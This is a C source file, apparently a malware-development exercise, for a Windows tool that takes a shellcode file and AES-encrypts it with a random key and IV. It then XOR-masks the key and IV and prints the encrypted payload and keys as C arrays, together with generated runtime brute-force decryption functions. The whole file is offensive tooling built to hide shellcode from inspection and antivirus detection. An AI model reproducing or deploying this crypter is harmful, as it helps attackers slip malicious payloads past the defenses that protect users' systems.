#include <stdio.h>
#include <windows.h>
#include <time.h>

#include "CtAes.h"
#include "EncryptKey.h"
#include "GenerateRandomKey.h"
#include "InstallAESEncryption.h"
#include "ReadFromDisk.h"

// We aren't going to worry too much about the
// funcitons required for encryption, as they 
// aren't even mine.

// We need a way to xor decrypt our key/iv at run
// time so that we can decrypt our content real 
// time.

// Run over every byte in our key arrary, xor it
// with our hint byte, and once every xor is
// equivilant to 0xFF return decrypted hex array.
void PrintDecryptionFunc(IN unsigned char* name, IN BYTE hint_byte)
{
    printf(
        "BYTE BruteForceDecryption%s(IN PBYTE key_array, IN SIZE_T key_size)\n"
        "{\n"
        "    INT i;\n"
        "    for (i = 0; i <= 0xFF; i++)\n"
        "    {\n"
        "        if (((key_array[1] ^ i) %% 0xFF) == 0x%0.2X)\n"
        "        {\n"
        "            break;\n"
        "        }\n"
        "    }\n\n"
        "    for (int x = 0; x < key_size; x++)\n"
        "    {\n"
        "        key_array[x] = key_array[x] ^ i;\n"
        "    }\n"
        "    return i;\n"
        "}\n\n",
        name, hint_byte
    );
}

// Easiest way to print our encrypted shellcode
// will be to as a hex string.

// For every byte in our buffer, format it to be
// "0xFF" format every 16 bytes.
void PrintHexString(IN unsigned char* name, IN const unsigned char* buffer, IN SIZE_T buffer_size)
{
    printf("unsigned char %s[%d] =", name, buffer_size);
    printf("\n{\n    ");

    SIZE_T            buffer_index;

    for (buffer_index = 0; buffer_index < buffer_size - 1; buffer_index++)
    {
        if (buffer_index % 12 == 0)
        {
            if (buffer_index > 0)
            {
                printf("\n    ");
            }
        }
        printf("0x%02X, ", buffer[buffer_index]);
    }

    printf("0x%02X", buffer[buffer_index]);
    printf("\n};\n\n");
}

// With our main function, we need to accomplish
// 5 requirements:

// 1. Read all the bytes from a file.
// 2. Generate a random key/iv for encryption.
// 3. Encrypt our shellcode.
// 4. Print our encrypted key, iv, and cipher.
// 5. Print our key/iv decryption functions.
void main(int argc, char* argv[])
{
    if (argc != 2)
    {
        printf("[!] Failed: Please Supply 1 Argument.\n");
        return;
    }

    // Requirements:
    // 1. Prepare our variables to move our file to.
    // 2. Pepare our variables to move our encrypted
    //    content.
    // 3. Save our key/iv to a variable for encryption.
    // 4. Print our key/iv/cipher/decryption
    //    functions.

    unsigned char*          file                    = NULL;
    DWORD                   file_size               = 0;

    PBYTE                   cipher_text             = NULL;
    SIZE_T                  cipher_size             = 0;

    PBYTE                   aes_key;
    PBYTE                   aes_iv;

    BYTE                    key_hint;
    BYTE                    iv_hint;

    if (!ReadFileFromDiskA(argv[1], &file, &file_size)) 
    {
        printf("[!] Failed To Read File From Disk.\n");
        return;
    }

    if (!GenerateRandomKey3(32, &aes_key) || !GenerateRandomKey3(16, &aes_iv))
    {
        printf("[!] Failed To Generate Keys.\n");
        return;
    }

    if (!InstallAesEncryptionViaCtAes(file, file_size, aes_key, aes_iv, &cipher_text, &cipher_size))
    {
        printf("[!] Failed To Encrypt Payload.\n");
        return;
    }

    if (!EncryptSubmittedKey(aes_key, 32, &key_hint) || !EncryptSubmittedKey(aes_iv, 16, &iv_hint))
    {
        printf("[!] Failed To Encrypt Keys.\n");
        return;
    }

    PrintHexString("aes_key",   aes_key,     32);
    PrintHexString("aes_iv",    aes_iv,      16);
    PrintHexString("shellcode", cipher_text, cipher_size);

    PrintDecryptionFunc("Key", key_hint);
    PrintDecryptionFunc("Iv",  iv_hint);
}
